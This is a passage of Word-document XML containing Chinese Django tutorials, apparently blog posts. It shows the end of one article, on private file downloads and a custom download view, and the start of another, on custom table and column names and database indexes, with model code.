    <w:p w14:paraId="69687927" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="670F7AFA" w14:textId="4EDF590F" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        raise Http404</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5779A608" w14:textId="768350F1" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>文件私有化的两种方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70E37258"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如果你想实现只有登录过的用户才能查看和下载某些文件，大概有两种方法，这里仅提供思路。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60A69A52"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上传文件放在media文件夹，文件名使用很长的随机字符串命名(uuid), 让用户无法根据文件名猜出这是什么文件。视图和模板里验证用户是否已登录，登录或通过权限验证后才显示具体的url。- 简单易实现，安全性不高，但对于一般项目已足够。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77D9C912" w14:textId="17816193" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>上传文件放在非media文件夹，用户即使知道了具体文件地址也无法访问，因为Django只会给media文件夹里每个文件创建独立url资源。视图和模板里验证用户是否已登录，登录或通过权限验证后通过自己编写的下载方法下载文件。- 安全性高，但实现相对复杂。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7903A8C1" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>GitHub源码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E293CDE" w14:textId="5802DB06" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>https://github.com/shiyunbo/django-file-upload-download</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F10E385" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>小结</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BE97A30" w14:textId="0CDB66C9" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们总结了何时需要自定义文件下载方法，并讲解了HttpResponse, StreamingHttpResponse和FileResponse的基本用法。我们还总结了使用自定义下载方法需要注意的事项(比如限定文件和文件夹)，最后谈了下如何实现文件私有化。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="592DCC6E" w14:textId="1C922E88" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果喜欢我们的文章，就加入微信收藏或点赞吧。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B66B016" w14:textId="59F1FAC7" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Best regards,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D7E2AD1" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>大江狗</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09800631" w14:textId="785AC986" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2018.10.24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77979A4D"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78" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django基础(19): Django Admin管理后台详解(上)</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0E076D31"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79" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django基础(20): Django admin管理后台详解(中)如何自定义list_display和list_filter</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4DF4B5F6"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80" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django基础(21): Django admin管理后台详解(下)如何自定义actions, 表单和美化admin</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3FF56AF2" w14:textId="5FE7D3A4" w:rsidR="001C47AF" w:rsidRDefault="00230D30" w:rsidP="00230D30">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046</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:hyperlink r:id="rId281" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="00230D30">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:b/>
            <w:color w:val="4D4D4D"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="27"/>
            <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
          </w:rPr>
          <w:t>Django基础(22): 数据库的设计之自定义表名，建立索引和使用多数据库主从配置</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4A9F85A8"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Django基础(22): 数据库的设计之自定义表名，建立索引和使用多数据库主从配置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64D747E9" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>原创 大江狗 </w:t>
      </w:r>
      <w:hyperlink r:id="rId282" w:history="1">
        <w:r w:rsidRPr="00230D30">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Python Web与Django开发</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 2018-11-19</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31EE933B" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>来自专辑</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28931341"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Django基础连载</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78BC6761" w14:textId="4E46A2DC" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在我们前篇教程</w:t>
      </w:r>
      <w:hyperlink r:id="rId283" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00230D30">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Django基础(12): QuerySet特性及高级使用技巧</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>里我们已经介绍了如何减少数据库的访问，节省内存从而提升网站性能。今天小编我将更近一步，分享下Django中如何设计和优化数据库, 从而实现你想要的功能或提升网站的性能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ED6EC1F" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>通过db_table和db_column自定义数据表名和字段名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53D8FCCF" w14:textId="2BF1454D" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>假如你的数据库里已经有了一张数据表，且该表包含多个字段，你希望通过Django直接访问该数据表的各个字段而不是重新建立新表，你</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>这时可以通过db_table指定数据表名，还可以通过db_column指定希望访问的字段名。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4667632C" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在我们创建一个模型时，Django的ORM会根据应用名(app name), 模型名(model name)和字段名(field name)自动在数据库中创建数据表。比如我们有一个Blog的应用，里面有Article模型, 其中Article模型有title这个字段，那么Django默认会创建一个名为blog_article的数据表，其中有title这个字段。假如我们希望把表名改为article，标题改为article_title，以便与已经存在的数据表或字段建立映射关系，我们可以按如下代码操作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52501B9E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Article(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="701EB9A5" w14:textId="7C4987F2" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    """</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>文章模型</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F2E2F27" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 通过db_column</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>自定义数据表中字段名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E02BAD7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>title = models.CharField('</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>标题</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>', max_length=200, db_column='article_title')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E4574E0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    slug = models.SlugField('slug', max_length=60, blank=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BF65E21" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40670EFF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def __str__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2826B52F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return self.title</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09F6574E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B5F433C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    class Meta:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AA28B35" w14:textId="35C3254F" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        db_table = 'article' # 通过db_table</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>自定义数据表名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58C33D81" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>通过db_index和Meta index选项给数据表字段建立索引</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="168FF417" w14:textId="0D133ACB" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用索引可快速访问数据库表中的特定信息。数据库索引好比是一本书前面的目录，没有索引目录的话，你访问书中某个页面需要从第1页遍历到最后一页，如果有目录，你可以快速地根据目录查找到所需要的页面。Django项目中如果你需要频繁地对数据表中的某些字段(如title)使用filter(), exclude()和order_by()方法进行查询，我们强烈建议你对这些字段建议索引(index), 提升查询效率。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60061E4C" w14:textId="7FE88ECF" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>要对模型中的某个字段建立数据库索引，你可以使用db_index选项，也可以使用Meta选项建立索引。使用Meta选项的好处是你可以一次性对多个字段建立索引，还可以对多个字段建立组合索引。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65C544F0" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>方法一: 使用db_index选项</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D6D9854" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>class Article(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BFF3C0E" w14:textId="4B6F1795" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    """</w:t>
      </w:r>
